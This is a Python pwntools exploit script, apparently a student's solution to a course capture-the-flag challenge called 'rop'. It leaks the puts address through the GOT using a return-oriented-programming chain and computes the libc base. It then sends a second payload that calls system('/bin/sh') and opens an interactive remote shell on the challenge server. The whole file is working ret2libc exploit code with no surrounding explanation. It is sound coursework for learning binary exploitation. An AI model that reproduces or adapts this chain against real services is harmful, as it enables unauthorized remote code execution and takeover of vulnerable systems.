from struct import pack
from pwn import *
#context.log_level = 'DEBUG'

username = 'aa6243'
binary_name = './rop'
e = ELF('./rop')

remote_host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
remote_port = 1343

gadget_1 = 0x004006b3 #pop rdi ret in ./rop
puts_plt_entry = 0x4004c0 
puts_GOT_entry = 0x601018
#didn't really use this gadget. It is for "pop rdi ret" in libc
gadget_2 = 0x0000000000022b9a

nop = asm('nop', arch="amd64")

payload = nop*40 + p64(gadget_1) + p64(puts_GOT_entry) + p64(puts_plt_entry)+ p64(e.symbols['main'])

#target = process('./rop')

#gdb.attach(target)

target = remote(remote_host, remote_port)

target.sendline(username)

preamble = target.recvuntil('tools..')

target.sendline(payload)

putsaddr1 = target.recv()[:8].strip().ljust(8, '\x00')
addr = target.recv()[:6] +'\x00'*2
putsaddr = u64(addr)
#just for debugging purposes 
print "Alhamdulillahi alla kulli haal. Address is: ", addr
print "Alhamdulillah, Got putsaddr. it  is ", hex(putsaddr)
libc = ELF('libc-2.19.so')
libc_base = int(putsaddr) - libc.symbols['puts']
#print "libc_base is ", hex(libc_base)
system_addr = libc_base + libc.symbols['system']
#print "System address is ", hex(system_addr) 
shell_straddr = libc_base + libc.data.find('/bin/sh\x00')
#print "Shell string is at this address: ", hex(shell_straddr)
payload2 = nop*40 + p64(gadget_1)+ p64(shell_straddr) + p64(system_addr)
target.sendline(payload2)
target.interactive()
